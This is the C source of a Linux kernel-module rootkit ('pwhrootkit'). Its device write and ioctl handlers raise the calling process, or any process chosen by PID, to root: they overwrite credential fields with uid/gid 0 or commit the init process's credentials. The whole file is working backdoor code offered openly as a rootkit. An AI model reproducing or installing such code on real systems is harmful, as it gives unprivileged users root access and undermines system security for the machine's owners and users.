#include "pwhrootkit.h"
#include <linux/uaccess.h>
#include <linux/init_task.h>
#include <linux/kstrtox.h>
#include <linux/sched.h>
#include <linux/pid.h>

extern struct cred init_cred;
extern struct task_struct *find_task_by_vpid(pid_t nr);

#define MODIFY_CRED 0x1111
#define ESCALATE    0x2222
#define GIVER       0x3333

struct kernel_args{
    void * content;
    int size;
};

static void ioctl_modify(void){
    struct cred * cur_cred;
    printk(KERN_INFO "[peiwithhao rootkit] Streight Modify the cred...");
    cur_cred = (struct cred *)current->cred;
    cur_cred->uid = cur_cred->euid = cur_cred->suid = cur_cred->fsuid = KUIDT_INIT(0);
    cur_cred->gid = cur_cred->egid = cur_cred->sgid = cur_cred->fsgid = KGIDT_INIT(0);

}

static void ioctl_escalation(void){
    struct task_struct *tsk;
        printk(KERN_INFO "[peiwithhao rootkit] Prepare kernel cred and commit...");
        /* 获取当前进程的task_struct */
        tsk = current;
        while(tsk != tsk->parent){
            tsk = tsk->parent;
        }
        /* 此时task变为init进程 */
        commit_creds((struct cred *)tsk->cred);
}

static int ioctl_giver(pid_t pid){
    struct pid *user_pid;
    struct task_struct *finded_task;
    struct cred * cur_cred;
        user_pid = find_get_pid(pid);
        if(IS_ERR(user_pid)){
            printk(KERN_INFO "[peiwithhao rootkit] Failed to find the pid...");
            return PTR_ERR(user_pid);
        }
    finded_task = get_pid_task(user_pid, PIDTYPE_PID);
        if(IS_ERR(finded_task)){
            printk(KERN_INFO "[peiwithhao rootkit] Failed to find the task_struct...");
            return PTR_ERR(finded_task);
        }
        cur_cred = (struct cred *)finded_task->cred;
        cur_cred->uid = cur_cred->euid = cur_cred->suid = cur_cred->fsuid = KUIDT_INIT(0);
        cur_cred->gid = cur_cred->egid = cur_cred->sgid = cur_cred->fsgid = KGIDT_INIT(0);
    return 0;

}



static ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t count, loff_t * ppos){
    return 0;
}
static ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
    char user_data[0x100];
    struct cred * cur_cred;
    struct task_struct * tsk;
    size_t size = count > 0x100 ? 0x100 : count;
    int flags;
    flags = copy_from_user(user_data, buf, size);
    if(!strncmp(user_data, "modify", 4)){
        printk(KERN_INFO "[peiwithhao rootkit] Streight Modify the cred...");
        cur_cred = (struct cred *)current->cred;
        cur_cred->uid = cur_cred->euid = cur_cred->suid = cur_cred->fsuid = KUIDT_INIT(0);
        cur_cred->gid = cur_cred->egid = cur_cred->sgid = cur_cred->fsgid = KGIDT_INIT(0);
    }else if(!strncmp(user_data, "escalate", 8)){
        printk(KERN_INFO "[peiwithhao rootkit] Prepare kernel cred and commit...");
        /* 获取当前进程的task_struct */
        tsk = current;
        while(tsk != tsk->parent){
            tsk = tsk->parent;
        }
        /* 此时task变为init进程 */
        commit_creds((struct cred *)tsk->cred);
    }else{
        printk(KERN_INFO "[peiwithhao rootkit] Unrecongnized command...");
    }
    return size;
}
static long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
    /*
    static char kontent[0x50];
    int ret;
    static struct kernel_args kargs;
    ret = copy_from_user(&kargs, (void *)arg, sizeof(struct kernel_args));
    ret = copy_from_user(kargs.content, ((struct kernel_args *)arg)->content, kargs.size);
    if(!ret){
        printk(KERN_INFO "[peiwithhao rootkit] Failed to copy user_data...");
        return ret;
    }
    */
    switch(cmd){
        case MODIFY_CRED:
            ioctl_modify();
            break;
        case ESCALATE:
            ioctl_escalation();
            break;
        case GIVER:
            ioctl_giver(arg);
            break;
        default:
            break;

    }
    return 0;
}
/* 打开类容 */
static int pwh_rootkit_open(struct inode *inode, struct file *file){
    return 0;
}
static int pwh_rootkit_release(struct inode *inode, struct file *file){
    return 3;
}
